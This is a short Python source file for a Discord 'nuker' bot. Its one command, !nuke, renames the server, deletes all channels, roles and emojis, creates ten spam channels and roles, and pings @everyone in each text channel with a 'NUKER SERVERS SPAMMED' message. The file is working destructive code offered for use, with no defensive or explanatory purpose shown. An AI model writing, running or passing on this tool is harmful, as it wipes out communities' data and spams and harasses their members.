import discord
import random
from discord.ext import commands


client = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@client.event
async def on_ready():
	print('Test')
	

# สแปมเซิร์ฟเวอร์
@client.command()
async def nuke(ctx):
	await ctx.message.delete()
	await ctx.guild.edit(name="NUKER SERVERS");
	print(f'Edit Guild : {ctx.guild.name} | NUKER SERVERS')
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			print(f'Delete Channels | {channel.id}')
		except Exception as f:
			print(f)
	for role in ctx.guild.roles:
		try:
			await role.delete()
			print(f'Delete Roles | {role.id}')
		except Exception as f:
			print(f)
	for emoji in ctx.guild.emojis:
		try:
			await emoji.delete()
			print(f'Delete Emojis | {emoji.id}')
		except Exception as f:
			print(f)
	# CREATE CHANNELS
	for i in range(10):
		color_list = [0xeb4034,0xdbeb34,0x4f34eb,0x34eb52]
		colors = random.choice(color_list)
		await ctx.guild.create_text_channel("nuke")
		print('Create Channels | nuke')
		await ctx.guild.create_role(name="nuker", color=colors)
		print('Create Roles | nuke')
	for message in ctx.guild.text_channels:
		try:
			await message.send('@everyone NUKER SERVERS SPAMMED !!')
			print(f'Event to Channels | {message.id}')
		except Exception as f:
			print(f)
	
client.run("token")